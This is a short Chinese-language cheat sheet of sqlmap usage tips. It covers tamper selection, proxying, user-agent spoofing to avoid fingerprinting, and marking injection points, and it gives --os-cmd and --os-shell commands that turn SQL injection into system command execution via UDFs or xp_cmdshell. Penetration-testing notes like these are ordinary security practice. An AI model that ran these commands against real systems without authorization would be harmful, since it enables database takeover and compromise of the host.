### 简介

|名称|描述|
|:-------------:|--|
|[sqlmap](https://github.com/sqlmapproject/sqlmap)| Automatic SQL injection and database takeover tool|

### tamper详解

根据 [sqlmap_tamper.csv](files/sqlmap_tamper.csv) 中的 数据库类型 与 绕过方式，选择合适的tamper(或自写脚本)

### 加快测试速度

指定数据库类型
```
--dbms Oracle
--dbms Mysql
--dbms "Microsoft Access"
```

### 设置proxy代理流量

格式为：`(http|https|socks4|socks5)://address:port`

如
```
--proxy=socks5://127.0.0.1:1080
```

### 设置user-agent避免指纹

随机user-agent
```
 --random-agent
```

安卓手机user-agent
```
--user-agent "Mozilla/5.0 (Linux; U; Android 2.2; en-us; Droid Build/FRG22D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
```

### 用*标记注入点

针对情况：伪静态 等不识别的格式

```
sqlmap -u xxx.com/index.php/Index/view/id/40*.html --dbs
```

-r 也是在请求包文件中的参数值后面加*号

### OS命令执行


前提1：数据库为MySQL/PostgreSQL/Microsoft SQL Server
前提2：当前用户有权限使用特定的函数. 在sqlmap中查看权限用 `--privileg`

--os-shell=whoami
```
#--os-cmd=执行系统命令
sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "Mysql" --os-cmd=whoami 
```

--os-shell
```
sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "Mysql" --os-shell #交互式shell
```

实现原理：

在MySQL、PostgreSQL: sqlmap上传一个二进制库，包含用户自定义的函数sys_exec()和sys_eval() 创建的这两个函数可以执行系统命令。

在Microsoft SQL Server: sqlmap将会使用xp_cmdshell存储过程，如果被禁（在Microsoft SQL Server 2005及以上版本默认禁制），sqlmap会重新启用它，如果不存在，会自动创建。
